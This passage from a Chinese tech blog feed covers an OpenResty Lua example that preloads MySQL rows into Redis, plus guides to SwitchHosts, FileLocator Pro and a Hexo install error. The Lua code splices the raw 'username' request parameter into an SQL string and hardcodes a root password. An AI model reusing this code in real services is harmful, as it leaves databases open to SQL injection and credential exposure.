values(null,&#x27;zhangsan&#x27;,&#x27;2020-11-11&#x27;,32222.0)&quot;</span>)<br>        --<span class="hljs-keyword">local</span> res,<span class="hljs-keyword">err</span>,errcode,sqlstate = <span class="hljs-keyword">db</span>:<span class="hljs-keyword">query</span>(<span class="hljs-string">&quot;update users set username=&#x27;lisi&#x27; where id = 6&quot;</span>)<br>        --<span class="hljs-keyword">local</span> res,<span class="hljs-keyword">err</span>,errcode,sqlstate = <span class="hljs-keyword">db</span>:<span class="hljs-keyword">query</span>(<span class="hljs-string">&quot;delete from users where id = 6&quot;</span>)<br>        <span class="hljs-keyword">db</span>:<span class="hljs-keyword">close</span>()<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="综合小案例"><a class="markdownIt-Anchor" href="#综合小案例"></a> 综合小案例</h3><p>使用ngx_lua模块完成Redis缓存预热。</p><p>分析:</p><p>（1）先得有一张表(users)</p><p>（2）浏览器输入如下地址</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">191.168</span>.<span class="hljs-number">200.133</span>?username=TOM<br></code></pre></td></tr></table></figure><p>（3）从表中查询出符合条件的记录，此时获取的结果为table类型</p><p>（4）使用cjson将table数据转换成json字符串</p><p>（5）将查询的结果数据存入Redis中</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">init_by_lua_block&#123;<br><br>redis = require &quot;resty.redis&quot;<br>    mysql = require &quot;resty.mysql&quot;<br>    cjson = require &quot;cjson&quot;<br>&#125;<br><span class="hljs-keyword">location</span> /&#123;<br>default_type &quot;text/html&quot;;<br>content_by_lua_block&#123;<br><br><span class="hljs-comment">--获取请求的参数username</span><br><span class="hljs-keyword">local</span> param = ngx.req.get_uri_args()[&quot;username&quot;]<br><span class="hljs-comment">--建立mysql数据库的连接</span><br><span class="hljs-keyword">local</span> db = mysql:<span class="hljs-built_in">new</span>()<br><span class="hljs-keyword">local</span> ok,err = db:<span class="hljs-keyword">connect</span>&#123;<br>host=&quot;192.168.200.111&quot;,<br>port=<span class="hljs-number">3306</span>,<br><span class="hljs-keyword">user</span>=&quot;root&quot;,<br><span class="hljs-keyword">password</span>=&quot;123456&quot;,<br><span class="hljs-keyword">database</span>=&quot;nginx_db&quot;<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ok <span class="hljs-keyword">then</span><br> ngx.say(&quot;failed connect to mysql:&quot;,err)<br> <span class="hljs-keyword">return</span><br><span class="hljs-keyword">end</span><br><span class="hljs-comment">--设置连接超时时间</span><br>db:set_timeout(<span class="hljs-number">1000</span>)<br><span class="hljs-comment">--查询数据</span><br><span class="hljs-keyword">local</span> <span class="hljs-keyword">sql</span> = &quot;&quot;;<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> param <span class="hljs-keyword">then</span><br><span class="hljs-keyword">sql</span>=&quot;select * from users&quot;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">sql</span>=&quot;select * from users where username=&quot;..&quot;&#x27;&quot;..param..&quot;&#x27;&quot;<br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">local</span> res,err,errcode,<span class="hljs-built_in">sqlstate</span>=db:query(<span class="hljs-keyword">sql</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> res <span class="hljs-keyword">then</span><br> ngx.say(&quot;failed to query from mysql:&quot;,err)<br> <span class="hljs-keyword">return</span><br><span class="hljs-keyword">end</span><br><span class="hljs-comment">--连接redis</span><br><span class="hljs-keyword">local</span> rd = redis:<span class="hljs-built_in">new</span>()<br>ok,err = rd:<span class="hljs-keyword">connect</span>(&quot;192.168.200.111&quot;,<span class="hljs-number">6379</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ok <span class="hljs-keyword">then</span><br> ngx.say(&quot;failed to connect to redis:&quot;,err)<br> <span class="hljs-keyword">return</span><br><span class="hljs-keyword">end</span><br>rd:set_timeout(<span class="hljs-number">1000</span>)<br><span class="hljs-comment">--循环遍历数据</span><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> ipairs(res) <span class="hljs-keyword">do</span><br> rd:<span class="hljs-keyword">set</span>(&quot;user_&quot;..v.username,cjson.encode(v))<br><span class="hljs-keyword">end</span><br>ngx.say(&quot;success&quot;)<br>rd:<span class="hljs-keyword">close</span>()<br>db:<span class="hljs-keyword">close</span>()<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Nginx</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用小工具</title>
    <link href="/2023/01/16/%E4%BD%BF%E7%94%A8%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    <url>/2023/01/16/%E4%BD%BF%E7%94%A8%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<p><ul class="markdownIt-TOC"><li><ul><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFhosts%E6%96%87%E4%BB%B6">什么是hosts文件？</a></li><li><a href="#switchhosts"><strong>SwitchHosts</strong></a></li></ul></li><li><a href="#%E5%8A%9F%E8%83%BD%E7%89%B9%E6%80%A7">功能特性</a></li><li><a href="#%E5%AE%89%E8%A3%85">安装</a><ul><li><a href="#%E4%B8%8B%E8%BD%BD">下载</a></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD">数据备份</a></li><li><a href="#%E5%BC%80%E5%8F%91%E4%BB%A5%E5%8F%8A%E6%9E%84%E5%BB%BA">开发以及构建</a><ul><li><a href="#%E5%BC%80%E5%8F%91">开发</a></li><li><a href="#%E6%9E%84%E5%BB%BA%E5%8F%8A%E6%89%93%E5%8C%85">构建及打包</a></li></ul></li><li><a href="#switchhost%E4%BD%BF%E7%94%A8">SwitchHost使用</a></li><li><a href="#%E6%B2%A1%E6%9C%89%E6%9D%83%E9%99%90">没有权限？</a></li><li><a href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9">注意事项</a><ul><li><a href="#%E5%89%8D%E8%A8%80">前言</a></li></ul></li><li><a href="#filelocator-pro-%E8%BD%AF%E4%BB%B6%E7%95%8C%E9%9D%A2">FileLocator Pro 软件界面</a></li><li><a href="#%E5%85%AD%E9%A1%B9%E7%89%B9%E8%89%B2%E5%8A%9F%E8%83%BD">六项特色功能</a><ul><li><a href="#1-%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2-%E6%94%AF%E6%8C%8150%E6%96%87%E6%A1%A3%E6%A0%BC%E5%BC%8F-%E4%BB%A5%E5%8F%8A-%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6">1. 全文检索 – 支持50+文档格式 以及 中文字符</a></li><li><a href="#2-%E6%B7%B1%E5%BA%A6%E6%90%9C%E7%B4%A2-%E6%90%9C%E7%B4%A2%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%86%85%E7%9A%84%E6%96%87%E4%BB%B6">2. 深度搜索 – 搜索压缩包内的文件</a></li><li><a href="#3-%E5%B8%83%E5%B0%94-%E6%AD%A3%E5%88%99-dos-%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E5%8F%AF%E7%94%A8%E5%A4%9A%E7%A7%8D%E6%90%9C%E7%B4%A2%E6%96%B9%E5%BC%8F-%E8%A7%84%E5%88%99">3. 布尔/ 正则/ DOS 表达式 – 可用多种搜索方式、规则</a></li><li><a href="#4-%E5%86%85%E5%A4%96%E5%85%BC%E5%BE%97%E7%9A%84%E6%96%87%E6%A1%A3%E6%9F%A5%E7%9C%8B%E5%99%A8">4. 内外兼得的文档查看器</a></li><li><a href="#5-%E4%B8%8E%E7%B3%BB%E7%BB%9F%E9%AB%98%E5%BA%A6%E9%9B%86%E6%88%90">5. 与系统高度集成</a></li><li><a href="#6-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84-unicode-%E6%94%AF%E6%8C%81">6. 文件系统的 Unicode 支持</a></li></ul></li><li><a href="#%E6%9B%B4%E9%AB%98%E6%95%88%E4%BD%BF%E7%94%A8-filelocator-pro">更高效使用 Filelocator Pro</a><ul><li><a href="#1-%E5%B0%86-filelocator-pro-%E5%AE%89%E8%A3%85%E5%88%B0-u-%E7%9B%98">1. 将 Filelocator Pro 安装到 U 盘</a></li><li><a href="#2-%E4%BF%9D%E5%AD%98%E6%90%9C%E7%B4%A2%E6%9D%A1%E4%BB%B6-%E5%8F%8A-%E5%AF%BC%E5%87%BA%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C">2. 保存搜索条件 及 导出搜索结果</a></li></ul></li></ul></p><p>[toc]</p><h1 id="switchhost使用指南"><a class="markdownIt-Anchor" href="#switchhost使用指南"></a> switchHost使用指南</h1><h3 id="什么是hosts文件"><a class="markdownIt-Anchor" href="#什么是hosts文件"></a> 什么是hosts文件？</h3><p>简单的说，hosts文件是用于本地dns服务的，采用ip域名的格式写在一个文本文件当中，Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统再会将网址提交DNS域名解析服务器进行IP地址的解析。</p><h3 id="switchhosts"><a class="markdownIt-Anchor" href="#switchhosts"></a> <strong>SwitchHosts</strong></h3><p>项目主页：<a href="https://switchhosts.vercel.app">https://switchhosts.vercel.app</a></p><p>SwitchHosts 是一个管理 hosts 文件的应用，基于 <a href="http://electron.atom.io/">Electron</a> 、<a href="https://facebook.github.io/react/">React</a>、<a href="https://umijs.org/">UmiJS</a> 、<a href="https://chakra-ui.com/">Chakra UI</a>、<a href="http://codemirror.net/">CodeMirror</a> 等技术开发。</p><blockquote><p>截图</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116195702055.png" alt="image-20230116195702055" /></p><h2 id="功能特性"><a class="markdownIt-Anchor" href="#功能特性"></a> 功能特性</h2><ul><li>快速切换 hosts 方案</li><li>hosts 语法高亮</li><li>支持从网络加载远程 hosts 配置</li><li>可从系统菜单栏图标快速切换 hosts</li></ul><h2 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h2><h3 id="下载"><a class="markdownIt-Anchor" href="#下载"></a> 下载</h3><p>你可以下载源码并自行构建，也可以从以下地址下载已构建好的版本：</p><ul><li><p><a href="https://github.com/oldj/SwitchHosts/releases">SwitchHosts Download Page (GitHub release)</a></p></li><li><p>下载完成后，解压压缩包，会有一个exe可执行文件</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116200044914.png" alt="image-20230116200044914" /></p></li><li><p>exe文件右键选择以 <strong>管理员身份运行，</strong> 并建议给全体用户安装（现在大多都是个人电脑，应该也无所谓），安装完成后页面如下（这里使用的网图，因为我已经安装过了，不是初始界面，同时因为版本问题，按钮位置和按钮形状可能会有些许不同）</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116195702055.png" alt="image-20230116195702055" /></p></li></ul><p>你也可以通过 <a href="https://community.chocolatey.org/packages/switchhosts">Chocolatey 包管理器</a>安装已构建好的版本：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">choco <span class="hljs-keyword">install</span> switchhosts<br></code></pre></td></tr></table></figure><h2 id="数据备份"><a class="markdownIt-Anchor" href="#数据备份"></a> 数据备份</h2><p>SwitchHosts 的数据文件存储于 <code>~/.SwitchHosts</code> (Windows 下存储于用户个人文件夹下的 <code>.SwitchHosts</code> 文件夹）， 其中 <code>~/.SwitchHosts/data</code> 文件夹包含数据，<code>~/.SwitchHosts/config</code> 文件夹包含各项配置信息。</p><h2 id="开发以及构建"><a class="markdownIt-Anchor" href="#开发以及构建"></a> 开发以及构建</h2><h3 id="开发"><a class="markdownIt-Anchor" href="#开发"></a> 开发</h3><ul><li>安装 <a href="https://nodejs.org/">Node.js</a></li><li>在项目根目录 <code>./</code> 下，运行 <code>npm install</code> 命令安装依赖</li><li>运行 <code>npm run dev</code> 命令启动开发服务</li><li>运行 <code>npm run start</code> 启动 App，即可开始开发及调试</li></ul><h3 id="构建及打包"><a class="markdownIt-Anchor" href="#构建及打包"></a> 构建及打包</h3><ul><li>推荐使用 <a href="https://github.com/electron-userland/electron-builder">electron-builder</a> 进行打包</li><li>转到项目根目录 ‘./’</li><li>运行 <code>npm run build</code></li><li>运行 <code>npm run make</code>，如果一切顺利，可在 <code>./dist</code> 目录下找到打包后的文件</li><li>首次运行可能需要花费一些时间，因为需要下载相关依赖文件。你也可以从 <a href="https://github.com/electron/electron/releases">这儿</a> 或者 <a href="https://npmmirror.com/mirrors/electron/">淘宝镜像</a> 手动下载，并保存到 <code>~/.electron</code> 目录下。更多信息可访问 <a href="http://electron.atom.io/docs/">Electron 文档</a>。</li></ul><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># build</span><br>npm <span class="hljs-built_in">run</span> build<br><br><span class="hljs-comment"># make</span><br>npm <span class="hljs-built_in">run</span> make <span class="hljs-comment"># the packed files will be in ./dist</span><br></code></pre></td></tr></table></figure><p>我们在开发Web项目过程中，一般会部署有多套环境，网址域名都相同，部署在不同的服务器上，有开发环境、测试环境、预发布环境、生产环境。经常要切换Hosts来访问，测试以及验证bug，如果纯手工修改这会花掉不少时间。</p><h2 id="switchhost使用"><a class="markdownIt-Anchor" href="#switchhost使用"></a> SwitchHost使用</h2><p>新建分组，一般是正式环境一组，测试环境一组，本地开发一组</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116200509366.png" alt="image-20230116200509366" /></p><h2 id="没有权限"><a class="markdownIt-Anchor" href="#没有权限"></a> 没有权限？</h2><p>当出现)这个情况需要检查host的可读写情况</p><p>打开host文件（C:\Windows\System32\drivers\etc\hosts）右键属性</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116200651479.png" alt="img" style="zoom:50%;" /><p>需要保证这里未被勾选及当前有足够权限</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116201252376.png" alt="image-20230116201252376" style="zoom:50%;" /><p>可以看到我们这里是没有权限的，需要给他权限，点击编辑，给足权限</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116201546086.png" alt="image-20230116201546086" style="zoom:50%;" /><p>点应用，然后一直确定</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116201046930.png" alt="image-20230116201046930" style="zoom:50%;" /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116201532767.png" alt="image-20230116201532767" style="zoom:67%;" /><p>成功！</p><h2 id="注意事项"><a class="markdownIt-Anchor" href="#注意事项"></a> 注意事项</h2><ul><li>1、如果使用了代理，修改 Hosts 也不会生效。因为浏览器会优先考虑代理工具的代理，建议调试的时候先关闭代理。</li><li>2、修改了hosts不生效，一般需要重启浏览器，如果是google浏览器可以不用重启，可以借助chrome://net-internals/#dns chrome://net-internals/#sockets 清掉<code>keep-alive</code> 和清浏览器 DNS 缓存。</li></ul><h1 id="filelocator-pro强大高效的无索引全文搜索软件"><a class="markdownIt-Anchor" href="#filelocator-pro强大高效的无索引全文搜索软件"></a> FileLocator Pro：强大高效的无索引全文搜索软件</h1><h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3><p>文件搜索一直是大家平时最常用的功能之一。在搜索文件名方面，目前已有不少软件做到了极致，比如 Everything ( <a href="http://www.voidtools.com/">官网</a> | <a href="http://xbeta.info/everything-search-tool.htm">介绍</a> ) 以及 操作新颖的晚辈 Listary Pro ( <a href="http://www.listary.com/">官网</a> | <a href="http://xbeta.info/listary4.htm">介绍</a> )  都是此领域之佳品。但有时，仅通过文件名并不足以快速找到所需文件和内容。因此，支持全文搜索的软件，也是重度知识管理、搜索用户的必备工具。这方面的解决方案中，Windows自带的索引功能，因为效率和占用资源问题，基本被用户抛弃（新版本有改进）。Google桌面及百度桌面，都基本停止更新。CDS（<a href="http://www.copernic.com/en/products/desktop-search/">Copernic Desktop Search</a>） 在国外有一定知名度，提供了免费家用版、专业版、企业版，但因为早期中文支持不佳，在国内用户极少（据称最新版本对中文支持极好）。倒是开源免费、小巧绿色的 <a href="http://locate32.cogit.net/">Locat32</a> 和开源免费、跨平台的 <a href="http://sourceforge.net/projects/docfetcher/">DocFetcher</a> 得到了国内用户的青睐。</p><p>今天 LYcHEE 所介绍的，是另一款全文检索软件 <a href="http://mythicsoft.com/filelocatorpro">FileLocator Pro</a> ( <a href="http://xbeta.info/filelocator-pro">介绍</a> | <a href="http://mythicsoft.com/filelocatorpro/help/cn/">中文帮助</a> )。相比同类软件，它的特点是：支持更多格式与压缩包，搜索速度更快，无索引不占硬盘空间、支持 多种搜索规则 及 日期、属性等细节设定。FileLocator Pro 在国内的影响正大迅速扩大，相关介绍文章还可参见<a href="http://www.appinn.com/filelocator-pro-gift/">小众软件</a>、<a href="http://www.portablesoft.org/filelocator-pro-portable/">精品绿色便携软件</a>。</p><p>FileLocator Pro 提供了30天的免费试用，国外单用户授权为 39 USD。因为开发商 Mythicsoft 非常重视中国用户，不仅在8月发布的新版中，提供了中文界面、<a href="http://mythicsoft.com/filelocatorpro/help/cn/">中文帮助文档</a>，并大幅降低在华售价，将授权（1年内免费升级）价格降至 <a href="http://item.taobao.com/item.htm?spm=a1z10.1.w4024-2413826112.1.utF9pH&amp;id=19649785919&amp;scene=taobao_shop">130元 人民币</a>。</p><p><a href="https://pan.baidu.com/s/1o8eg6CUT-OodSaNguk1fFg?pwd=yyds">绿色版网盘链接</a></p><h2 id="filelocator-pro-软件界面"><a class="markdownIt-Anchor" href="#filelocator-pro-软件界面"></a> FileLocator Pro 软件界面</h2><p>软件的界面大体分为三个区域 (图1)：<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207213920367.png" alt="image-20230207213920367" /></p><p>图1：FileLocator Pro 界面区域介绍</p><p>1. 选项卡式搜索区：FileLocator Pro 允许同时进行多个搜索进程。</p><p>2. 文件列表区：所有满足关键条件的文件都会在这里显示。此区域支持全部默认的资源管理器动作，包括直接拖放文件至新位置、重命名等。</p><p>3. 内置查看器：可定位、高亮显示文件中的关键词，但不可对原内容进行修改。幸好 FileLocator Pro 还支持多款主流文本编辑器，具体参考下文特点<br />第4条。</p><h2 id="六项特色功能"><a class="markdownIt-Anchor" href="#六项特色功能"></a> 六项特色功能</h2><p>FileLocator Pro 特性众多，罗列在 <a href="http://mythicsoft.com/filelocatorpro">官网</a>最下方。因为软件本身支持30天无功能限制试用，且支持32/64 位的 Win XP – Win 8(包括之间所有server版本)，很多闪光点都可在您使用中慢慢挖掘。本篇限于篇幅，就介绍其中六个关键点：</p><h3 id="1-全文检索-支持50文档格式-以及-中文字符"><a class="markdownIt-Anchor" href="#1-全文检索-支持50文档格式-以及-中文字符"></a> 1. 全文检索 – 支持50+文档格式 以及 中文字符</h3><p>FileLocator Pro 安装完成后就默认支持常见的 Office以及 PDF 等大部分主流文档格式。而官方推荐用户同时安装 MicrosoftOffice 2010筛选包( 微软官网[下载](<a href="http://www.microsoft.com/zh-">http://www.microsoft.com/zh-</a><br />CN/download/details.aspx?id=17062) ) 便可使软件支持额的 20余种格式，其中主要包括：.docx/ .docm/.pptx/ .pptm/ .xlsx/ .xlsm等。随着筛选包的不断更新，相信 FileLocator Pro 的搜索范围和效率也会有所提高。</p><p>虽然软件界面已本地化，但我们国内用户更关心的是它对中文字符的搜索是否到位。请放心，官方已经改进了软件内核，目前能对所有支持的格式的中文进行检索，如下图所示：<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207213935470.png" alt="image-20230207213935470" /></p><p>图2: 最常见的几种文档中都能搜索到中文，包括 PDF !</p><h3 id="2-深度搜索-搜索压缩包内的文件"><a class="markdownIt-Anchor" href="#2-深度搜索-搜索压缩包内的文件"></a> 2. 深度搜索 – 搜索压缩包内的文件</h3><p>出于工作便利的考虑，打包各文件至一个压缩包互相拷贝传输十分普及。但“不修边幅”的文件命名以及日积月累的随意保存位置，很快就难以找到某一个重要文件。似乎逐个打开压缩包寻找并不靠谱。而FileLocator Pro 可以在 .rar/ .zip/ .7z 等22种主流压缩格式下轻松全文搜索，让藏匿于某压缩包内的重要文件快速浮出水面 (图3)。<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207213948629.png" alt="image-20230207213948629" /><br />图3: 能直接搜索压缩包内的文档内容，无需解压</p><h3 id="3-布尔-正则-dos-表达式-可用多种搜索方式-规则"><a class="markdownIt-Anchor" href="#3-布尔-正则-dos-表达式-可用多种搜索方式-规则"></a> 3. 布尔/ 正则/ DOS 表达式 – 可用多种搜索方式、规则</h3><p>FileLocator Pro 除了支持最常见的 纯文本 输入关键词搜索外，还添加了 布尔/正则/DOS<br />规则，从而做到真正灵活的定位搜索！当然，如果你对这些专业的表达式规则一窍不通无从下手也没有关系， FileLocator Pro非常友好地为新手提供了详细的使用说明(图4)和简单易懂的“表达式向导”(图5)。而这一切，在全中文的界面以及帮助文档下，可让学习时间大大缩短。相信用不了多久你就能完全掌握、灵活使用。<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207213959584.png" alt="image-20230207213959584" /><br />图4: 表达式使用类型说明</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207214019887.png" alt="image-20230207214019887" /><br />图5: 简单易懂的“正则表达式向导” 同时，使用时间日期作为额外添加条件可以进一步缩小结果范围，节约时间。</p><h3 id="4-内外兼得的文档查看器"><a class="markdownIt-Anchor" href="#4-内外兼得的文档查看器"></a> 4. 内外兼得的文档查看器</h3><p>之前提到过可以直接使用内置查看器浏览符合搜索条件的文档全文，支持高亮。不过功能有限，只读模式浏览为最大软肋。<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207214033121.png" alt="image-20230207214033121" /><br />图6：编辑器配置</p><p>幸好，FileLocator Pro 为众多高级用户预设了8种主流文本编辑器方案，如 Vim、EditPlus、NotePad++等<br />(图6)。编辑器位置选定后就可在以后直接调用，查看文档。同时，软件还为各编辑器预设了命令行参数，方便传递选定文档的 路径 及 行号。</p><h3 id="5-与系统高度集成"><a class="markdownIt-Anchor" href="#5-与系统高度集成"></a> 5. 与系统高度集成</h3><p>通过设置，可添加快速启动 FileLocator Pro 至右键菜单；替换默认的资源管理器搜索；支持热键启动。AHK化并不困难。</p><h3 id="6-文件系统的-unicode-支持"><a class="markdownIt-Anchor" href="#6-文件系统的-unicode-支持"></a> 6. 文件系统的 Unicode 支持</h3><p>FileLocator Pro 是以 Windows Unicode程序库建立起的，因此对文件系统搜索提供了完整的Unicode支持，类型有UTF-16LE、UTF-16BE和UTF-8。</p><h2 id="更高效使用-filelocator-pro"><a class="markdownIt-Anchor" href="#更高效使用-filelocator-pro"></a> 更高效使用 Filelocator Pro</h2><h3 id="1-将-filelocator-pro-安装到-u-盘"><a class="markdownIt-Anchor" href="#1-将-filelocator-pro-安装到-u-盘"></a> 1. 将 Filelocator Pro 安装到 U 盘</h3><p>很多朋友会想到将 Filelocator Pro 装在 U 盘设备中，随身携带，即插即用。要实现这一点并不难，只需将软件的配置/日志/收藏 文件夹转移到 U盘安装目录内即可。具体的操作步骤如下(图7)：<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207214051117.png" alt="image-20230207214051117" /><br />图7: 将 FileLocator Pro 制作成便携版并不难</p><ol><li><p>打开 FileLocator Pro 配置 – 高级 – 文件夹 设置；</p></li><li><p>将日志/配置/收藏文件夹的目录分别改为：</p></li></ol><p>(FileLocatorProFolder)\logs\  (FileLocatorProFolder)\config\<br />$(FileLocatorProFolder)\Favorites\</p><ol start="3"><li>点击“确定”保存。</li></ol><h3 id="2-保存搜索条件-及-导出搜索结果"><a class="markdownIt-Anchor" href="#2-保存搜索条件-及-导出搜索结果"></a> 2. 保存搜索条件 及 导出搜索结果</h3><p>如果经常使用某几个特定搜索条件，为什么不将它们保存起来以便以后随时调取呢？点击“保存”按钮可把当前条件保存为 .srf格式并自动关联。当需要的时候，只需双击该格式文件就自动启动 Filelocator Pro 并载入搜索条件。当然，保存至收藏夹也是一个非常好的方法<br />(图8)。<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207214114620.png" alt="image-20230207214114620" /><br />图8: 合理利用收藏夹</p><p>同时，搜索结果也可保存为 Text、CSV、XML/HTML 等格式存，方便处理、存档。</p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Host修改</tag>
      
      <tag>小工具</tag>
      
      <tag>switchHost</tag>
      
      <tag>FileLocator Pro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HEXO安装(Win10 64 bit )，遇到cmd报错：&#39;hexo&#39; 不是内部或外部命令，也不是可运行的程序</title>
    <link href="/2023/01/14/HEXO%E5%AE%89%E8%A3%85(Win10%2064%20bit%20)%EF%BC%8C%E9%81%87%E5%88%B0cmd%E6%8A%A5%E9%94%99%EF%BC%9A&#39;hexo&#39;%20%E4%B8%8D%E6%98%AF%E5%86%85%E9%83%A8%E6%88%96%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4%EF%BC%8C%E4%B9%9F%E4%B8%8D%E6%98%AF%E5%8F%AF%E8%BF%90%E8%A1%8C%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
    <url>/2023/01/14/HEXO%E5%AE%89%E8%A3%85(Win10%2064%20bit%20)%EF%BC%8C%E9%81%87%E5%88%B0cmd%E6%8A%A5%E9%94%99%EF%BC%9A&#39;hexo&#39;%20%E4%B8%8D%E6%98%AF%E5%86%85%E9%83%A8%E6%88%96%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4%EF%BC%8C%E4%B9%9F%E4%B8%8D%E6%98%AF%E5%8F%AF%E8%BF%90%E8%A1%8C%E7%9A%84%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="hexo安装win10-64-bit-遇到cmd报错hexo-不是内部或外部命令也不是可运行的程序"><a class="markdownIt-Anchor" href="#hexo安装win10-64-bit-遇到cmd报错hexo-不是内部或外部命令也不是可运行的程序"></a> HEXO安装(Win10 64 bit )，遇到cmd报错：‘hexo’ 不是内部或外部命令，也不是可运行的程序</h2><p>由于使用要使用多个版本的node，下载了个<code>nvm</code>。切换了系统使用的node版本。过一段时间，使用<code>hexo</code>更新博客的时候，发出**'hexo’不是内部或外部命令，也不是可运行的程序**的报错。<code>node</code>换回原来的版本也是不行。甚至以前下载的一系列工具都使用不了（PS：vue)。</p><p>折腾来折腾去一直不行，索性重开。😡😡😡😡</p><ol><li><p>使用nvm下载 v16.16.0的node</p></li><li><p>使用v16.16.0的node，配置淘宝镜像。啥<strong>node_cache</strong> <strong>node_global</strong>根本不用设置 方便的很</p></li><li><p>安装hexo啦</p><p>安装的2个命令</p><p>npm install hexo-cli -g</p><p>npm install hexo --save</p></li><li><p>查看版本的命令</p><p>hexo -v</p><p>然后寄了</p></li></ol><p>看别人的例子呢，到这都是一帆风顺，程序正常执行，但是到我这就，<strong>谢谢你node！！！！</strong></p><p>下面是解决之道，经过我一番搜索，实验。然后找到了解决方法。</p><p>说是要配置下环境变量。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114191052165.png" alt="image-20230114191052165" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114191234730.png" alt="image-20230114191234730" /></p><p>下面，咱先仔细看下，安装完成之后的，目录。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114191346874.png" alt="image-20230114191346874" /></p><p><img 